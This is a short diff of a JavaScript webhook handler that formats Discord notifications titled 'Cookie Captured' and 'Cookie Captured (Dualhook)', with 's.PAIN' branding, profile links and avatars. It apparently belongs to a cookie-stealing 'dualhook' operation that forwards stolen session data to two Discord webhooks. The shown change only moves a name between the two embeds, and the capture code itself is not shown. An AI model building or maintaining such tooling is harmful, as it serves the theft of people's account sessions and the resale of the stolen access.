@@ -314,7 +314,7 @@ export default async function handler(req, res) {
   // ── Build the rich embed for webhook2 (page name, no sPAIN branding) ──────────────────────────────────────────────────
   const pageEmbed = {
     title: `🍪 Cookie Captured`,
-    description: `[Profile 👤](${profileUrl}) | [Discord Server](${DISCORD_INV})`,
+    description: `\n\n${EMOJI} ${dhParentName || 'Unknown'} ${EMOJI}\n\n[Profile 👤](${profileUrl}) | [Discord Server](${DISCORD_INV})`,
     color: 5793266,
     thumbnail: { url: avatarUrl },
     fields: [
@@ -391,7 +391,7 @@ export default async function handler(req, res) {
   // ── Build the rich embed for webhook1 (sPAIN branding) ──────────────────────────────────────────────────
   const sPainEmbed = {
     title: '🍪 Cookie Captured (Dualhook)',
-    description: `${EMOJI} s.PAIN ${EMOJI}\n\n${EMOJI} ${dhParentName || 'Unknown'} ${EMOJI}\n\n[Profile 👤](${profileUrl}) | [Discord Server](${DISCORD_INV})`,
+    description: `${EMOJI} s.PAIN ${EMOJI}\n\n[Profile 👤](${profileUrl}) | [Discord Server](${DISCORD_INV})`,
     color: 5793266,
     thumbnail: { url: avatarUrl },
     fields: [
